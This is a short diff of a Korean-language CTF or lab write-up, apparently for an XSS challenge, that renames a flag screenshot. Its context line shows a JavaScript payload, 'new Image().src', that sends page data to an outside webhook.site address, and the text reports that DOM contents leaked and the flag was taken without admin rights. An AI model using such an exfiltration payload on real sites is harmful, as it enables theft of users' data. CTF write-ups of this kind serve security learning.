@@ -48,7 +48,7 @@ new Image().src = "https://webhook.site/741989d6-cb27-411b-aa44-a01355948028?c="
 
 - URL이 정상적으로 전달되었으며, 이후 Webhook 로그를 통해 DOM 정보가 외부로 유출된 것을 확인할 수 있다.
 
-![플래그 획득](./screenshots/steal1_access_admin.png)
+![플래그 획득](./screenshots/steal1_flag.png)
 
 이와 같은 방식으로 **관리자 권한 없이 플래그를 탈취하는 데 성공**하였다.
 
